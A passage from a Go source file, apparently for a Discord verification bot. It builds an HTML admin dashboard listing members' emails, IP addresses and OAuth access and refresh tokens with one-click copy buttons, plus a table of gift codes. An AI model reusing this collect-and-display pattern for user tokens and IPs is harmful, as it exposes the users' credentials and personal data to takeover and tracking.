                <th>Membros</th>
                <th>Usos</th>
                <th>Max Usos</th>
                <th>Criado em</th>
                <th>Último Guild</th>
                <th></th>
              </tr>
            </thead>
            <tbody id="gifts-tbody"></tbody>
          </table>
        </div>
        <div class="pagination" id="gifts-pagination"></div>
      </div>
    </div>
  </div>

  <!-- Detail modal -->
  <div class="modal-overlay" id="modal" onclick="closeModal(event)">
    <div class="modal" id="modal-content">
      <button class="modal-close" onclick="closeModalDirect()">
        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
      </button>
      <h2 id="modal-title">Detalhes</h2>
      <div id="modal-body"></div>
    </div>
  </div>

  <!-- Toast -->
  <div id="toast">✓ Copiado!</div>

  <script>
    const MEMBERS = %s;
    const GIFTS   = %s;
    const BOT_ID  = '%s';
    const PAGE_SIZE = 20;

    let memberPage = 1;
    let giftPage   = 1;

    // Set export time
    document.getElementById('exportTime').textContent = new Date().toLocaleString('pt-BR');

    // ── Tab switch ──────────────────────────────────────────────────────────
    function switchTab(tab) {
      document.getElementById('panel-members').style.display = tab === 'members' ? 'block' : 'none';
      document.getElementById('panel-gifts').style.display   = tab === 'gifts'   ? 'block' : 'none';
      document.getElementById('tab-members').classList.toggle('active', tab === 'members');
      document.getElementById('tab-gifts').classList.toggle('active', tab === 'gifts');
    }

    // ── Helpers ─────────────────────────────────────────────────────────────
    function esc(s) {
      if (!s) return '—';
      return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
    }

    function trunc(s, n) {
      if (!s) return '—';
      return s.length > n ? s.slice(0, n) + '…' : s;
    }

    function fmtDate(d) {
      if (!d) return '—';
      try { return new Date(d).toLocaleString('pt-BR'); } catch { return d; }
    }

    function statusBadge(s) {
      const map = { active: 'badge-green', used: 'badge-blue', expired: 'badge-orange', pending: 'badge-orange' };
      const cls = map[s] || 'badge-blue';
      return '<span class="badge ' + cls + '">' + esc(s) + '</span>';
    }

    function avatarHtml(m) {
      const initials = (m.username || '?')[0].toUpperCase();
      if (m.avatar) {
        const ext = m.avatar.startsWith('a_') ? 'gif' : 'png';
        return '<img class="avatar-img" src="https://cdn.discordapp.com/avatars/' + m.id + '/' + m.avatar + '.' + ext + '?size=64" onerror="this.outerHTML=\'<div class=\\\'avatar-mini\\\'>' + initials + '</div>\'">';
      }
      return '<div class="avatar-mini">' + initials + '</div>';
    }

    // ── Copy ────────────────────────────────────────────────────────────────
    function copy(text) {
      navigator.clipboard.writeText(text).then(() => {
        const t = document.getElementById('toast');
        t.classList.add('show');
        setTimeout(() => t.classList.remove('show'), 2000);
      });
    }

    // ── Render Members ──────────────────────────────────────────────────────
    function filterMembers() {
      const q      = (document.getElementById('search-members').value || '').toLowerCase();
      const filter = document.getElementById('filter-verified').value;
      return MEMBERS.filter(m => {
        const matchQ = !q || (m.username||'').toLowerCase().includes(q)
          || (m.id||'').includes(q)
          || (m.email||'').toLowerCase().includes(q)
          || (m.ip||'').includes(q);
        const matchF = filter === 'all'
          || (filter === 'verified'   && m.verified_at)
          || (filter === 'unverified' && !m.verified_at);
        return matchQ && matchF;
      });
    }

    function renderMembers() {
      memberPage = 1;
      _renderMembersPage();
    }

    function _renderMembersPage() {
      const data  = filterMembers();
      const total = data.length;
      const start = (memberPage - 1) * PAGE_SIZE;
      const slice = data.slice(start, start + PAGE_SIZE);

      document.getElementById('cnt-members').textContent = total;

      const tbody = document.getElementById('members-tbody');
      if (total === 0) {
        tbody.innerHTML = '<tr><td colspan="9"><div class="empty"><svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="M23 21v-2a4 4 0 0 0-3-3.87"/><path d="M16 3.13a4 4 0 0 1 0 7.75"/></svg><p>Nenhum membro encontrado</p></div></td></tr>';
        document.getElementById('members-pagination').innerHTML = '';
        return;
      }

      tbody.innerHTML = slice.map((m, i) => {
        const idx = start + i + 1;
        const verified = m.verified_at
          ? '<span class="badge badge-green">✓ Verificado</span>'
          : '<span class="badge badge-orange">Pendente</span>';
        return '<tr onclick="openMemberModal(' + JSON.stringify(JSON.stringify(m)).slice(1,-1) + ')" style="cursor:pointer">' +
          '<td class="mono" style="color:var(--dim)">' + idx + '</td>' +
          '<td><div class="avatar-cell">' + avatarHtml(m) + '<div><div style="font-weight:600">' + esc(m.username) + '</div>' +
            (m.discriminator && m.discriminator !== '0' ? '<div style="font-size:11px;color:var(--muted)">#' + esc(m.discriminator) + '</div>' : '') +
          '</div></div></td>' +
          '<td><span class="mono">' + esc(m.id) + '</span></td>' +
          '<td>' + esc(trunc(m.email, 28)) + '</td>' +
          '<td><span class="mono" style="font-size:11px">' + esc(m.ip||'—') + '</span></td>' +
          '<td>' + verified + '</td>' +
          '<td style="font-size:12px;color:var(--muted)">' + fmtDate(m.verified_at) + '</td>' +
          '<td><div class="token-wrap"><span class="token-cell">' + trunc(m.access_token, 18) + '</span>' +
            (m.access_token ? '<button class="copy-btn" onclick="event.stopPropagation();copy(\'' + m.access_token.replace(/'/g,"\\'") + '\')" title="Copiar token"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/></svg></button>' : '') +
          '</div></td>' +
          '<td><button class="copy-btn" onclick="event.stopPropagation();copy(\'' + esc(m.id) + '\')" title="Copiar ID"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/></svg></button></td>' +
          '</tr>';
      }).join('');

      renderPagination('members', total, memberPage, p => { memberPage = p; _renderMembersPage(); });
    }

    // ── Render Gifts ────────────────────────────────────────────────────────
    function filterGifts() {
      const q      = (document.getElementById('search-gifts').value || '').toLowerCase();
      const filter = document.getElementById('filter-gift-status').value;
      return GIFTS.filter(g => {
        const matchQ = !q || (g.id||'').toLowerCase().includes(q)
          || (g.last_guild_id||'').includes(q)
          || (g.created_by||'').toLowerCase().includes(q);
        const matchF = filter === 'all' || g.status === filter;
        return matchQ && matchF;
      });
    }

    function renderGifts() {
      giftPage = 1;
      _renderGiftsPage();
    }

    function _renderGiftsPage() {
      const data  = filterGifts();
      const total = data.length;
      const start = (giftPage - 1) * PAGE_SIZE;
      const slice = data.slice(start, start + PAGE_SIZE);

      document.getElementById('cnt-gifts').textContent = total;

      const tbody = document.getElementById('gifts-tbody');
      if (total === 0) {
        tbody.innerHTML = '<tr><td colspan="9"><div class="empty"><svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><path d="M20 12v10H4V12"/><path d="M22 7H2v5h20V7z"/><path d="M12 22V7"/><path d="M12 7H7.5a2.5 2.5 0 010-5C11 2 12 7 12 7z"/><path d="M12 7h4.5a2.5 2.5 0 000-5C13 2 12 7 12 7z"/></svg><p>Nenhum gift encontrado</p></div></td></tr>';
        document.getElementById('gifts-pagination').innerHTML = '';
        return;
      }

      tbody.innerHTML = slice.map((g, i) => {
        const idx = start + i + 1;
        const pct = g.max_uses > 0 ? Math.round((g.used_count / g.max_uses) * 100) : 0;
        return '<tr onclick="openGiftModal(' + JSON.stringify(JSON.stringify(g)).slice(1,-1) + ')" style="cursor:pointer">' +
          '<td class="mono" style="color:var(--dim)">' + idx + '</td>' +
          '<td><span class="mono" style="color:var(--accent2)">' + esc(g.id) + '</span></td>' +
          '<td>' + statusBadge(g.status) + '</td>' +
          '<td><strong>' + (g.members_count||0) + '</strong></td>' +
          '<td>' + (g.used_count||0) + '</td>' +
          '<td>' + (g.max_uses||0) + ' <span style="font-size:11px;color:var(--muted)">(' + pct + '%%)</span></td>' +
          '<td style="font-size:12px;color:var(--muted)">' + fmtDate(g.created_at) + '</td>' +
          '<td><span class="mono" style="font-size:11px;color:var(--muted)">' + esc(g.last_guild_id||'—') + '</span></td>' +
          '<td><button class="copy-btn" onclick="event.stopPropagation();copy(\'' + esc(g.id) + '\')" title="Copiar ID"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/></svg></button></td>' +
          '</tr>';
      }).join('');

      renderPagination('gifts', total, giftPage, p => { giftPage = p; _renderGiftsPage(); });
    }

    // ── Pagination ──────────────────────────────────────────────────────────
    function renderPagination(id, total, page, cb) {
      const pages = Math.ceil(total / PAGE_SIZE);
      const el = document.getElementById(id + '-pagination');
      if (pages <= 1) { el.innerHTML = '<span>' + total + ' registros</span>'; return; }

      const start = (page - 1) * PAGE_SIZE + 1;
      const end   = Math.min(page * PAGE_SIZE, total);

      let btns = '';
      btns += '<button class="page-btn" onclick="paginationCb(\'' + id + '\',' + (page-1) + ')" ' + (page===1?'disabled':'') + '>‹</button>';
      const lo = Math.max(1, page-2), hi = Math.min(pages, page+2);
      if (lo > 1) btns += '<button class="page-btn" onclick="paginationCb(\'' + id + '\',1)">1</button>' + (lo > 2 ? '<span style="color:var(--muted);padding:0 4px">…</span>' : '');
      for (let p = lo; p <= hi; p++) {
        btns += '<button class="page-btn' + (p===page?' active':'') + '" onclick="paginationCb(\'' + id + '\',' + p + ')">' + p + '</button>';
      }
      if (hi < pages) btns += (hi < pages-1 ? '<span style="color:var(--muted);padding:0 4px">…</span>' : '') + '<button class="page-btn" onclick="paginationCb(\'' + id + '\',' + pages + ')">' + pages + '</button>';
      btns += '<button class="page-btn" onclick="paginationCb(\'' + id + '\',' + (page+1) + ')" ' + (page===pages?'disabled':'') + '>›</button>';

      el.innerHTML = '<span>' + start + '–' + end + ' de ' + total + '</span><div class="page-btns">' + btns + '</div>';
    }

    const _pageCbs = {};
    function paginationCb(id, p) { if (_pageCbs[id]) _pageCbs[id](p); }
    _pageCbs['members'] = p => { memberPage = p; _renderMembersPage(); };
    _pageCbs['gifts']   = p => { giftPage   = p; _renderGiftsPage(); };

    // ── Modals ──────────────────────────────────────────────────────────────
    function openMemberModal(jsonStr) {
      const m = JSON.parse(jsonStr);
      document.getElementById('modal-title').textContent = m.username || 'Membro';
      const rows = [
        ['ID',           m.id],
        ['Username',     m.username + (m.discriminator && m.discriminator !== '0' ? '#' + m.discriminator : '')],
        ['Email',        m.email],
        ['IP',           m.ip],
        ['Verificado em',fmtDate(m.verified_at)],
        ['Guild ID',     m.guild_id],
        ['Client ID',    m.client_id],
        ['Access Token', m.access_token],
        ['Refresh Token',m.refresh_token],
        ['Desverificado',m.unverified_at ? fmtDate(m.unverified_at) : null],
        ['Motivo',       m.reason],
      ].filter(r => r[1]);
      document.getElementById('modal-body').innerHTML = rows.map(([k,v]) =>
        '<div class="modal-row"><div class="modal-key">' + k + '</div><div class="modal-val">' + esc(v) +
        '<button class="copy-btn" style="margin-left:8px" onclick="copy(\'' + String(v).replace(/'/g,"\\'") + '\')"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/></svg></button></div></div>'
      ).join('');
      document.getElementById('modal').classList.add('open');
    }

    function openGiftModal(jsonStr) {
      const g = JSON.parse(jsonStr);
      document.getElementById('modal-title').textContent = 'Gift — ' + g.id;
      const rows = [
        ['ID',           g.id],
        ['Bot ID',       g.bot_id],
        ['Status',       g.status],
        ['Membros',      g.members_count],
        ['Max Usos',     g.max_uses],
        ['Usos',         g.used_count],
        ['Criado por',   g.created_by],
        ['Criado em',    fmtDate(g.created_at)],
        ['Atualizado em',g.updated_at ? fmtDate(g.updated_at) : null],
        ['Atualizado por',g.updated_by],
        ['Último uso',   g.last_used && g.last_used !== '0001-01-01T00:00:00Z' ? fmtDate(g.last_used) : null],
        ['Último Guild', g.last_guild_id],
      ].filter(r => r[1] != null && r[1] !== '');
      document.getElementById('modal-body').innerHTML = rows.map(([k,v]) =>
        '<div class="modal-row"><div class="modal-key">' + k + '</div><div class="modal-val">' + esc(String(v)) +
        '<button class="copy-btn" style="margin-left:8px" onclick="copy(\'' + String(v).replace(/'/g,"\\'") + '\')"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/></svg></button></div></div>'
      ).join('');
      document.getElementById('modal').classList.add('open');
    }

    function closeModal(e) { if (e.target.id === 'modal') closeModalDirect(); }
    function closeModalDirect() { document.getElementById('modal').classList.remove('open'); }
    document.addEventListener('keydown', e => { if (e.key === 'Escape') closeModalDirect(); });

    // ── Init ────────────────────────────────────────────────────────────────
    renderMembers();
    renderGifts();
  </script>
</body>
</html>`,
		// avatar letter
		strings.ToUpper(string([]rune(bot.ClientID)[0])),
		// header meta
		bot.ClientID, bot.ID,
		// download href
		bot.ClientID,
		// info panel
		bot.ID, bot.ClientID, mainServerDisplay,
		// stats
		len(bot.Members), verifiedCount,
		len(gifts), activeGifts, usedGifts,
		verificationRate(len(bot.Members), verifiedCount),
		expiredGifts,
		// tab counts
		len(bot.Members), len(gifts),
		// JS data
		string(membersJSON), string(giftsJSON), bot.ClientID,
	)
}

func dbNotFoundPage() string {
	return `<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="utf-8"/><meta name="viewport" content="width=device-width,initial-scale=1"/>
  <title>Bot não encontrado</title>
  <link href="https://fonts.googleapis.com/css2?family=Syne:wght@700;800&family=JetBrains+Mono&display=swap" rel="stylesheet">
  <style>
    *{box-sizing:border-box;margin:0;padding:0}
    body{font-family:'Syne',sans-serif;background:#080a0f;color:#e8eaf6;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px;}
    .card{max-width:420px;width:100%;background:#0d1017;border:1px solid rgba(99,120,255,0.12);border-radius:20px;padding:48px;text-align:center;}
    .icon{font-size:48px;margin-bottom:24px;}
    h1{font-size:24px;font-weight:800;margin-bottom:12px;}
    p{color:#6b7280;font-size:14px;}
    .mono{font-family:'JetBrains Mono',monospace;font-size:12px;color:#6378ff;margin-top:8px;}
  </style>
</head>
<body>
  <div class="card">
    <div class="icon">🔍</div>
    <h1>Bot não encontrado</h1>
    <p>O bot ID fornecido não existe na database.</p>
    <div class="mono">404 · NOT FOUND</div>
  </div>
</body>
</html>`
}

// ── Utils ─────────────────────────────────────────────────────────────────────

func nvl(s, fallback string) string {
	if s == "" {
		return fallback
	}
	return s
}

func sanitizeFilename(s string) string {
	r := strings.NewReplacer("/", "_", "\\", "_", ":", "_", "*", "_", "?", "_", "\"", "_", "<", "_", ">", "_", "|", "_")
	return r.Replace(s)
}

func verificationRate(total, verified int) string {
	if total == 0 {
		return "0"
	}
	rate := float64(verified) / float64(total) * 100
	if rate == float64(int(rate)) {
		return fmt.Sprintf("%d", int(rate))
	}
	return fmt.Sprintf("%.1f", rate)
}